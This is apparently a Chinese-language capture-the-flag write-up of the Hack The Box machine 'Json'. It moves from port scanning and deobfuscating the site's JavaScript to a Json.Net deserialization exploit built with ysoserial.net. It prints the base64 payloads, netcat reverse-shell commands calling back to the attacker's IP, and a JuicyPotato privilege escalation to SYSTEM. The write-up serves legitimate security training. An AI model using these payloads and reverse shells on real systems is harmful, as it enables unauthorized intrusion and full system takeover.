# 端口扫描
### 全端口扫描

~~~bash
┌──(kali㉿kali)-[~/json]
└─$ sudo nmap -sT -p- --min-rate 1000  10.10.10.158 -oA nmap/ports
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 03:33 EST
Nmap scan report for 10.10.10.158
Host is up (0.080s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 71.32 seconds

~~~

### 默认脚本扫描

~~~bash  
┌──(kali㉿kali)-[~/json]
└─$ sudo nmap -sT -sV -sC -O -p 21,80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49157,49158  10.10.10.158 -oA nmap/sC
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 03:43 EST
Nmap scan report for 10.10.10.158
Host is up (0.099s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-title: Json HTB
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (96%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows Server 2012 R2 Update 1 (96%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (96%), Microsoft Windows Vista SP1 (96%), Microsoft Windows Server 2012 or Server 2012 R2 (95%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 R2 (94%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (93%), Microsoft Windows Server 2008 SP1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:33:1c (VMware)
|_clock-skew: mean: -13m32s, deviation: 0s, median: -13m32s
| smb2-time: 
|   date: 2024-11-25T08:31:02
|_  start_date: 2024-11-25T08:13:20
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.07 seconds

~~~

### 漏洞脚本扫描

~~~
┌──(kali㉿kali)-[~/json]
└─$ sudo nmap -sT --script=vuln -p 21,80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49157,49158  10.10.10.158 -oA nmap/vuln
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 03:48 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.158
Host is up (0.12s latency).

PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|_  /login.html: Possible admin folder
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: No accounts left to try

Nmap done: 1 IP address (1 host up) scanned in 506.60 seconds

~~~

### UDP扫描

~~~
┌──(kali㉿kali)-[~/json]
└─$ sudo nmap -sU --top-ports 20 10.10.10.158 -oA nmap/UDP                                                              
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 05:01 EST
Nmap scan report for 10.10.10.158
Host is up (0.12s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    closed        dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open          netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 23.95 seconds

~~~

# 21(ftp)
拒绝匿名登陆
~~~
┌──(kali㉿kali)-[~/json]
└─$ ftp 10.10.10.158 
Connected to 10.10.10.158.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.158:kali): anonymous
331 Password required for anonymous
Password: 
530 Login or password incorrect!
ftp: Login failed
ftp> 
ftp> quit
221 Goodbye
~~~

# 134/445(smb)
拒绝连接
~~~
┌──(kali㉿kali)-[~/json]
└─$ smbclient -L 10.10.10.158
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED

~~~


# 80(web)
进入主页一闪而过这个界面

![](Pasted%20image%2020241125165110.png)

然后是一个登录框

![](Pasted%20image%2020241125165136.png)

js文件可能有问题
发现了一处被混淆的js代码

![](Pasted%20image%2020241125165502.png)

找一个[美化网站](https://beautifier.io/)美化一下

![](Pasted%20image%2020241125190134.png)

美化后的代码如下，但似乎没什么变化

~~~js
 var _0xd18f = ["\x70\x72\x69\x6E\x63\x69\x70\x61\x6C\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x24\x68\x74\x74\x70", "\x24\x73\x63\x6F\x70\x65", "\x24\x63\x6F\x6F\x6B\x69\x65\x73", "\x4F\x41\x75\x74\x68\x32", "\x67\x65\x74", "\x55\x73\x65\x72\x4E\x61\x6D\x65", "\x4E\x61\x6D\x65", "\x64\x61\x74\x61", "\x72\x65\x6D\x6F\x76\x65", "\x68\x72\x65\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x6C\x6F\x67\x69\x6E\x2E\x68\x74\x6D\x6C", "\x74\x68\x65\x6E", "\x2F\x61\x70\x69\x2F\x41\x63\x63\x6F\x75\x6E\x74\x2F", "\x63\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x6C\x6F\x67\x69\x6E\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x63\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73", "", "\x65\x72\x72\x6F\x72", "\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C", "\x6C\x6F\x67\x69\x6E", "\x6D\x65\x73\x73\x61\x67\x65", "\x49\x6E\x76\x61\x6C\x69\x64\x20\x43\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73\x2E", "\x73\x68\x6F\x77", "\x6C\x6F\x67", "\x2F\x61\x70\x69\x2F\x74\x6F\x6B\x65\x6E", "\x70\x6F\x73\x74", "\x6A\x73\x6F\x6E", "\x6E\x67\x43\x6F\x6F\x6B\x69\x65\x73", "\x6D\x6F\x64\x75\x6C\x65"];
angular[_0xd18f[30]](_0xd18f[28], [_0xd18f[29]])[_0xd18f[15]](_0xd18f[16], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function(_0x30f6x1, _0x30f6x2, _0x30f6x3) {
    _0x30f6x2[_0xd18f[17]] = {
        UserName: _0xd18f[18],
        Password: _0xd18f[18]
    };
    _0x30f6x2[_0xd18f[19]] = {
        message: _0xd18f[18],
        show: false
    };
    var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]);
    if (_0x30f6x4) {
        window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20]
    };
    _0x30f6x2[_0xd18f[21]] = function() {
        _0x30f6x1[_0xd18f[27]](_0xd18f[26], _0x30f6x2[_0xd18f[17]])[_0xd18f[13]](function(_0x30f6x5) {
            window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20]
        }, function(_0x30f6x6) {
            _0x30f6x2[_0xd18f[19]][_0xd18f[22]] = _0xd18f[23];
            _0x30f6x2[_0xd18f[19]][_0xd18f[24]] = true;
            console[_0xd18f[25]](_0x30f6x6)
        })
    }
}])[_0xd18f[15]](_0xd18f[0], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function(_0x30f6x1, _0x30f6x2, _0x30f6x3) {
    var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]);
    if (_0x30f6x4) {
        _0x30f6x1[_0xd18f[5]](_0xd18f[14], {
            headers: {
                "\x42\x65\x61\x72\x65\x72": _0x30f6x4
            }
        })[_0xd18f[13]](function(_0x30f6x5) {
            _0x30f6x2[_0xd18f[6]] = _0x30f6x5[_0xd18f[8]][_0xd18f[7]]
        }, function(_0x30f6x6) {
            _0x30f6x3[_0xd18f[9]](_0xd18f[4]);
            window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12]
        })
    } else {
        window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12]
    }
}])
~~~

可读性还是不是很好，我们自己再修改一下

~~~
┌──(kali㉿kali)-[~/json]
└─$ echo '"\x70\x72\x69\x6E\x63\x69\x70\x61\x6C\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x24\x68\x74\x74\x70", "\x24\x73\x63\x6F\x70\x65", "\x24\x63\x6F\x6F\x6B\x69\x65\x73", "\x4F\x41\x75\x74\x68\x32", "\x67\x65\x74", "\x55\x73\x65\x72\x4E\x61\x6D\x65", "\x4E\x61\x6D\x65", "\x64\x61\x74\x61", "\x72\x65\x6D\x6F\x76\x65", "\x68\x72\x65\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x6C\x6F\x67\x69\x6E\x2E\x68\x74\x6D\x6C", "\x74\x68\x65\x6E", "\x2F\x61\x70\x69\x2F\x41\x63\x63\x6F\x75\x6E\x74\x2F", "\x63\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x6C\x6F\x67\x69\x6E\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x63\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73", "", "\x65\x72\x72\x6F\x72", "\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C", "\x6C\x6F\x67\x69\x6E", "\x6D\x65\x73\x73\x61\x67\x65", "\x49\x6E\x76\x61\x6C\x69\x64\x20\x43\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73\x2E", "\x73\x68\x6F\x77", "\x6C\x6F\x67", "\x2F\x61\x70\x69\x2F\x74\x6F\x6B\x65\x6E", "\x70\x6F\x73\x74", "\x6A\x73\x6F\x6E", "\x6E\x67\x43\x6F\x6F\x6B\x69\x65\x73", "\x6D\x6F\x64\x75\x6C\x65"' -e
"principalController", "$http", "$scope", "$cookies", "OAuth2", "get", "UserName", "Name", "data", "remove", "href", "location", "login.html", "then", "/api/Account/", "controller", "loginController", "credentials", "", "error", "index.html", "login", "message", "Invalid Credentials.", "show", "log", "/api/token", "post", "json", "ngCookies", "module" -e
~~~

用数组的值替换后的代码如下

~~~
angular.module("principalController", ["ngCookies"])

    .controller("loginController", ["$http", "$scope", "$cookies", function($http, $scope, $cookies) {

        $scope.credentials = {

            UserName: "",

            Password: ""

        };

        $scope.error = {

            message: "",

            show: false

        };

        var token = $cookies.get("OAuth2");

        if (token) {

            window.location.href = "index.html";

        }

        $scope.login = function() {

            $http.post("/api/token", $scope.credentials).then(function(response) {

                window.location.href = "index.html";

            }, function(errorResponse) {

                $scope.error.message = "Invalid Credentials.";

                $scope.error.show = true;

                console.log(errorResponse);

            });

        };

    }])

    .controller("principalController", ["$http", "$scope", "$cookies", function($http, $scope, $cookies) {

        var token = $cookies.get("OAuth2");

        if (token) {

            $http.get("/api/Account/", {

                headers: {

                    "Bearer": token

                }

            }).then(function(response) {

                $scope.UserName = response.data.Name;

            }, function(errorResponse) {

                $cookies.remove("OAuth2");

                window.location.href = "login.html";

            });

        } else {

            window.location.href = "login.html";

        }

    }]);
~~~

这里暴露了两个接口/api/Account/ 、/api/token

先试一下登录

![](Pasted%20image%2020241125192439.png)

得到了一个token
token似乎是是base64编码的json

~~~
┌──(kali㉿kali)-[~/json]
└─$ echo "eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=" | base64 -d
{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}        
~~~

带上token再去请求/api/account

![](Pasted%20image%2020241125193254.png)

试试输入一些脏数据

~~~
┌──(kali㉿kali)-[~/json]
└─$ echo "{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"lizi","Rol":"Administrator"" | base64 
e0lkOjEsVXNlck5hbWU6YWRtaW4sUGFzc3dvcmQ6MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMsTmFtZTpsaXppLFJvbDpBZG1pbmlzdHJhdG9yCg==

~~~

再次发送，发现我们的token似乎被序列化了

![](Pasted%20image%2020241125193734.png)

google如何利用反序列化

![](Pasted%20image%2020241125194954.png)

发现了[这个库](https://github.com/pwntester/ysoserial.net)

试了一下其他命令发现无回显，让靶机ping一下我们，看看有没有回应

~~~
PS C:\Users\lizis\Desktop\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "ping -c 5 10.10.16.10"
ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLWMgNSAxMC4xMC4xNi4xMCddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
~~~

![](Pasted%20image%2020241125205654.png)

收到回应

~~~
┌──(kali㉿kali)-[~/json/ysoserial.net]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:9f:68:34 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.105/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0
       valid_lft 3884sec preferred_lft 3884sec
    inet6 fe80::f23e:baaf:aad7:c63d/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:9f:68:3e brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.130/24 brd 192.168.2.255 scope global dynamic noprefixroute eth1
       valid_lft 1180sec preferred_lft 1180sec
    inet6 fe80::ef80:cc14:bc7c:e632/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
6: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.16.10/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:4::1008/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::75d9:4b88:d7f:4e09/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever
                                                                                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/json/ysoserial.net]
└─$ sudo tshark -i tun0
Running as user "root" and group "root". This could be dangerous.
 ** (tshark:1020961) 07:55:16.203823 [WSUtil WARNING] ./wsutil/filter_files.c:242 -- read_filter_list(): '/usr/share/wireshark/cfilters' line 1 doesn't have a quoted filter name.
 ** (tshark:1020961) 07:55:16.204041 [WSUtil WARNING] ./wsutil/filter_files.c:242 -- read_filter_list(): '/usr/share/wireshark/cfilters' line 2 doesn't have a quoted filter name.
Capturing on 'tun0'
    1 0.000000000  10.10.16.10 → 10.10.10.158 TCP 60 33814 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM TSval=1228712633 TSecr=0 WS=128
    2 0.078210983 10.10.10.158 → 10.10.16.10  TCP 60 80 → 33814 [SYN, ACK] Seq=0 Ack=1 Win=8192 Len=0 MSS=1338 WS=256 SACK_PERM TSval=1611440 TSecr=1228712633
    3 0.078282683  10.10.16.10 → 10.10.10.158 TCP 52 33814 → 80 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=1228712711 TSecr=1611440
    4 0.079668883  10.10.16.10 → 10.10.10.158 HTTP 1237 GET /api/Account HTTP/1.1 
    5 0.161506266 10.10.10.158 → 10.10.16.10  TCP 1378 HTTP/1.1 500 Internal Server Error  [TCP segment of a reassembled PDU]
    6 0.161594766  10.10.16.10 → 10.10.10.158 TCP 52 33814 → 80 [ACK] Seq=1186 Ack=1327 Win=67072 Len=0 TSval=1228712795 TSecr=1611448
    7 0.239314549 10.10.10.158 → 10.10.16.10  HTTP/XML 1280 HTTP/1.1 500 Internal Server Error 
    8 0.239370249  10.10.16.10 → 10.10.10.158 TCP 52 33814 → 80 [ACK] Seq=1186 Ack=2555 Win=69760 Len=0 TSval=1228712872 TSecr=1611448
    9 1.241635240  10.10.16.10 → 10.10.10.158 TCP 52 33814 → 80 [FIN, ACK] Seq=1186 Ack=2555 Win=69760 Len=0 TSval=1228713875 TSecr=1611448
   10 1.320729323 10.10.10.158 → 10.10.16.10  TCP 52 80 → 33814 [FIN, ACK] Seq=2555 Ack=1187 Win=131072 Len=0 TSval=1611564 TSecr=1228713875
   11 1.320765923  10.10.16.10 → 10.10.10.158 TCP 52 33814 → 80 [ACK] Seq=1187 Ack=2556 Win=69760 Len=0 TSval=1228713954 TSecr=1611564

~~~

试一下nc不落地执行

~~~
PS C:\Users\lizis\Desktop\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "\\10.10.16.10\share\nc64.exe -e powershell.exe 10.10.16.10 443"
ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIFxcXFwxMC4xMC4xNi4xMFxcc2hhcmVcXG5jNjQuZXhlIC1lIHBvd2Vyc2hlbGwuZXhlIDEwLjEwLjE2LjEwIDQ0MyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
~~~

监听的端口收到回复，但是交互性似乎有问题

~~~
┌──(kali㉿kali)-[~/json]
└─$ sudo rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.10.158] 50265
Windows PowerShell 
Copyright (C) 2014 Microsoft Corporation. All rights reserved.

whoami

~~~

试了一下改绑成cmd.exe就可以了

~~~
PS C:\Users\lizis\Desktop\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "\\10.10.16.10\share\nc64.exe -e cmd.exe 10.10.16.10 443"
ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIFxcXFwxMC4xMC4xNi4xMFxcc2hhcmVcXG5jNjQuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTYuMTAgNDQzJ10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0=
~~~

~~~
┌──(kali㉿kali)-[~/json]
└─$ sudo rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.10.158] 50290
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
json\userpool

c:\windows\system32\inetsrv>

~~~

拿到userflag

~~~
c:\Users\userpool\Desktop>type user.txt
type user.txt
4476caa8f241631c660bd54fa1ffecc5

~~~

# 提权
查看系统信息，发现hotfix没有开，并且版本较老

~~~
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 JSON
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-80005-00001-AA602
Original Install Date:     5/22/2019, 4:27:16 PM
System Boot Time:          11/25/2024, 3:13:13 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              es-mx;Spanish (Mexico)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     8,191 MB
Available Physical Memory: 7,532 MB
Virtual Memory: Max Size:  9,471 MB
Virtual Memory: Available: 8,805 MB
Virtual Memory: In Use:    666 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.158
                                 [02]: fe80::c86a:3730:129c:a629
                                 [03]: dead:beef::c86a:3730:129c:a629
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

~~~

SeImpersonatePrivilege也开放了，大概率可以利用juicypotato

~~~
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

~~~

最后文件还是落地了，哎

~~~
c:\tmp>JuicyPotato.exe -l 2444 -p c:\windows\system32\cmd.exe -a "/c c:\tmp\nc64.exe -e cmd.exe 10.10.16.10 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
JuicyPotato.exe -l 2444 -p c:\windows\system32\cmd.exe -a "/c c:\tmp\nc64.exe -e cmd.exe 10.10.16.10 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 2444
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

~~~

拿到rootshell

~~~
┌──(kali㉿kali)-[~/json]
└─$ sudo rlwrap nc -lvnp 4444                                                                                                   
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.10.158] 50434
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

~~~

拿到rootflag

~~~
C:\Users\superadmin\Desktop>type root.txt
type root.txt
d6f83c4f580ffd9c4a10af60de23b836

~~~